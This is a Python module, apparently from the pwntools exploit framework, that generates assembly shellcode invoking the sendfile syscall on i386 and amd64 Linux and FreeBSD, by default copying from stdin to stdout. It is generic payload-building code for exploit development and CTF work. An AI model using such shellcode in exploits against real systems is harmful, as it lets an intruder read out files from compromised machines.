from pwn.internal.shellcode_helper import *
from ..misc.pushstr import pushstr

@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'])
def sendfile(in_fd = 0, out_fd = 1, arch = None, os = None):
    """Args: [in_fd (imm/reg) = STDIN_FILENO, [out_fd (imm/reg) = STDOUT_FILENO]

    Calls the sendfile syscall with the given arguments.
    """

    in_fd  = arg_fixup(in_fd)
    out_fd = arg_fixup(out_fd)

    if arch == 'i386':
        if os == 'linux':
            return _sendfile_linux_i386(in_fd, out_fd)
        elif os == 'freebsd':
            return _sendfile_freebsd_i386(in_fd, out_fd)
    elif arch == 'amd64':
        if os == 'linux':
            return _sendfile_linux_amd64(in_fd, out_fd)
        elif os == 'freebsd':
            return _sendfile_freebsd_amd64(in_fd, out_fd)

    no_support('sendfile', os, arch)

def _sendfile_linux_i386(in_fd, out_fd):
    return """
        """ + pwn.shellcode.mov('ecx', in_fd, raw = True) + """ ; in_fd
        """ + pwn.shellcode.mov('ebx', out_fd, raw = True) + """ ; out_fd
        xor eax, eax
        mov al, SYS_sendfile
        cdq ; offset
        mov esi, 0x7fffffff
        int 0x80
"""

def _sendfile_linux_amd64(in_fd, out_fd):
    out = []

    if out_fd == 0:
        out += ['xor rdi, rdi']
    elif isinstance(out_fd, int):
        out += [pushstr(p64(out_fd), null = False, raw = True),
                'pop rdi']
    else:
        out += ['mov rdi, %s' % str(out_fd)]

    if in_fd == 0:
        out += ['xor rsi, rsi']
    elif isinstance(in_fd, int):
        out += [pushstr(p64(in_fd), null = False, raw = True),
                'pop rsi']
    else:
        out += ['mov rsi, %s' % str(in_fd)]

    out += ['push SYS_sendfile',
            'pop rax',
            'cdq',
            'mov r10d, 0x7fffffff',
            'syscall']

    return indent_shellcode(out)

def _sendfile_freebsd_i386(in_fd, out_fd):
    return """
        """ + pwn.shellcode.mov('ecx', in_fd, raw = True) + """ ; in_fd
        """ + pwn.shellcode.mov('ebx', out_fd, raw = True) + """ ; out_fd
        xor eax, eax
        push eax ; flags
        push eax ; sbytes
        push eax ; hdtr
        push eax ; nbytes
        push eax ; offset
        push ebx ; socket
        push ecx ; fd
        push eax
        mov ax, SYS_sendfile
        int 0x80
"""

def _sendfile_freebsd_amd64(in_fd, out_fd):
    out = []

    if in_fd == 0:
        out += ['xor rdi, rdi']
    elif isinstance(in_fd, int):
        out += [pushstr(p64(in_fd), null = False, raw = True),
                'pop rdi']
    else:
        out += ['mov rdi, %s' % str(in_fd)]

    if out_fd == 0:
        out += ['xor rsi, rsi']
    elif isinstance(out_fd, int):
        out += [pushstr(p64(out_fd), null = False, raw = True),
                'pop rsi']
    else:
        out += ['mov rsi, %s' % str(out_fd)]

    out += ['xor ecx, ecx',
            'mul ecx',
            'mov r8, rax',
            'mov r9, rax',
            'push rax',
            'push rax',
            'mov ax, SYS_sendfile',
            'syscall']

    return indent_shellcode(out)
